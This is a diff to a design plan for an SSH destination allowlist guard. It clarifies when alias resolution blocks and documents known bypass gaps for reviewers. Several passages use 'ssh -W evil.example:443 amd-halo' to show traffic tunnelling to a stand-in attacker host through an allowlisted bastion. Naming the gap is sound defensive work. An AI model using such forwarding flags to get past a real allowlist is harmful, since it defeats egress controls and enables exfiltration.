@@ -144,9 +144,28 @@ Add a module-private helper, resolving one destination token:
 ```
 def _resolve_ssh_destination(token, options, env, prog, ctx) -> list[str]:
     """Hosts the allowlist must clear for this destination: the resolved
-    HostName plus any ProxyJump hop, or [token] unchanged if ssh -G cannot
-    be run safely or cannot resolve it."""
+    HostName plus any ProxyJump hop.
+
+    Returns [token] (literal fallback) ONLY in the three narrow cases where
+    the literal token is provably the effective destination and no resolution
+    could safely run: the resolver's ssh is path-qualified or outside
+    SYSTEM_PREFIXES (step 2); the config chain is genuinely absent (step 3);
+    or a bare destination with no host/config-selecting override fails ssh -G
+    while the config chain is genuinely absent (step 4). Every other
+    unsafe-or-uncertain condition RAISES _GuardError (block) — it does not
+    return [token] — because returning the literal would clear an allowlisted
+    token the resolver never actually resolved. The complete mapping of each
+    condition to "block" or "literal fallback" is the failure-mode contract
+    table below; this helper must implement that table, not this summary."""
 ```
+
+The docstring deliberately states only the three literal-fallback cases and
+defers every blocking case to the failure-mode table: the earlier draft's "or
+`[token]` unchanged if `ssh -G` cannot be run safely or cannot resolve it"
+read as though *any* unsafe or unresolved case returns the literal, which would
+reintroduce the allowlisted-literal bypass the step-3 scan and the step-4/5
+block rules exist to close. An implementer must treat the table — not a
+one-line paraphrase — as the contract.
 
 Behaviour, in order:
 
@@ -756,9 +775,32 @@ on the destination): SSH config matching keys on the login user through
 let a `Match user` hop route past the allowlist — see resolver step 4. The
 `user@` prefix on a destination is preserved for **every** ssh-backed family
 member, not only `ssh` (see "User preservation across the family" below).
-Everything else on the command line (positional host, `-p`/`-i`/… transport flags
-that do not select the config) is neither forwarded nor rejected — it does not
-affect which host `ssh -G` reports.
+
+The genuinely inert transport flags on the command line (`-p` port, `-i`
+identity file, …) are neither forwarded nor rejected — they do not select which
+config applies, so they do not change which host `ssh -G` reports, and they do
+not route the session elsewhere.
+
+**Not inert — a pre-existing forwarding/tunnelling gap this plan does not close
+(review follow-up).** The SSH *forwarding and control* options are a different
+matter and must **not** be described as harmless: `-W <host:port>` makes the
+connection's effective payload target `host:port` (the positional host becomes a
+bastion); `-L`/`-R`/`-D` open local/remote/dynamic forwarding channels that can
+carry data to an arbitrary endpoint; and `-O`/`-S` drive a control socket. None
+of these change which host `ssh -G` *reports*, so alias resolution neither reads
+nor affects them — but they route or tunnel traffic independently of the resolved
+host. Today's guard already lists `-W`/`-L`/`-R`/`-D`/`-O`/`-S` in
+`_SSH_VALUE_FLAGS` (so their values are consumed) yet the option loop acts only on
+`-o`, `-J` and `scp -S`, so `ssh -W evil.example:443 amd-halo` is **allowed** on
+the base branch while ssh pipes stdio to `evil.example:443` through the
+allowlisted `amd-halo`. This is a **pre-existing** gap, identical on the base
+branch and **independent of alias resolution** — the same category as the
+untrusted-family-executable gap (step 2, Open question #2). This plan therefore
+does not close it and must not claim the resolver makes these flags safe;
+resolving the positional host does not make it worse either. Closing it (reject
+the forwarding/control options, or allowlist-check the forwarded/`-W` endpoint
+host) is scoped to a separate task, `eccc457e-9047-47c8-8f1d-d87e271e176c`, and
+recorded as Open question #7 for the approver to decide whether to fold in here.
 
 **User preservation across the family (review follow-up).** Resolver step 4 keeps
 a `user@` prefix so `ssh -G` resolves under the same login user `Match user`
@@ -849,13 +891,24 @@ ever *adds* a block (a bad HostName, ProxyJump or ProxyCommand) or defers to the
 literal match it replaces.
 
 "No new vector" is the precise claim, and it is narrower than "fail closed in
-every respect". One pre-existing gap it does **not** close: when the resolver
-falls back to the literal match because the PATH-selected ssh-family binary is
-untrusted (outside `SYSTEM_PREFIXES`), the command is still *allowed* for an
-allowlisted host even though the untrusted binary runs — identical to today's
-base-branch behaviour, and tracked as tasks `8a5be352-003a-4c2c-955d-5e913f4ca625`
-and `dfed2140-25dc-4290-b718-b41d0561236b` (see step 2 and Open questions).
-Resolution does not make this worse; it also does not fix it.
+every respect". Two pre-existing gaps it does **not** close, both identical on
+the base branch and both independent of alias resolution:
+
+- When the resolver falls back to the literal match because the PATH-selected
+  ssh-family binary is untrusted (outside `SYSTEM_PREFIXES`), the command is
+  still *allowed* for an allowlisted host even though the untrusted binary runs —
+  tracked as tasks `8a5be352-003a-4c2c-955d-5e913f4ca625` and
+  `dfed2140-25dc-4290-b718-b41d0561236b` (see step 2 and Open question #2).
+- The SSH forwarding/control options (`-W`, `-L`, `-R`, `-D`, `-O`, `-S`) tunnel
+  or route traffic to endpoints the guard never allowlist-checks, so
+  `ssh -W evil.example:443 amd-halo` reaches `evil.example` through the
+  allowlisted bastion — tracked as task
+  `eccc457e-9047-47c8-8f1d-d87e271e176c` (see "Faithful resolution" and Open
+  question #7).
+
+Resolution does not make either worse; it also does not fix either. They are
+named here so the "no new vector" claim is not misread as "fail closed in every
+respect".
 
 One caveat qualified this during review and is now **resolved** (thread #3): `ssh
 -G` evaluates `Match exec` config blocks and runs `ProxyCommand`/`LocalCommand`/
@@ -1426,6 +1479,23 @@ should decide deliberately.
    to require the snapshot now or accept the residual race as a documented limit
    (the snapshot adds per-resolution copy cost and must reproduce OpenSSH's
    include/relative-path resolution into the snapshot tree, which is non-trivial).
+7. **The SSH forwarding/control options tunnel past the allowlist.** `-W`,
+   `-L`, `-R`, `-D` and the control-socket `-O`/`-S` route or tunnel traffic to
+   endpoints the guard never checks: `ssh -W evil.example:443 amd-halo` reaches
+   `evil.example` through the allowlisted bastion `amd-halo`, and
+   `-L`/`-R`/`-D` open forwarding channels to arbitrary hosts. The guard consumes
+   their values (they are in `_SSH_VALUE_FLAGS`) but the option loop ignores them,
+   so this is **allowed today on the base branch**. It is independent of alias
+   resolution — those flags do not change which host `ssh -G` reports — so this
+   plan deliberately does not close it (closing it is tracked as
+   `eccc457e-9047-47c8-8f1d-d87e271e176c`). The approver should decide whether to
+   fold a fix into this change (reject the forwarding/control options, or
+   allowlist-check `-W`'s target and the forwarded endpoints) or leave it to the
+   separate task, weighing it the same way as Open question #2's
+   untrusted-family-executable gap. The plan's scope keeps it separate; the
+   "Faithful resolution" section and "Why this is not a new exfiltration vector"
+   record that these flags are *not* harmless and that resolution neither opens
+   nor closes the hole.
 
 ## Estimated complexity
 
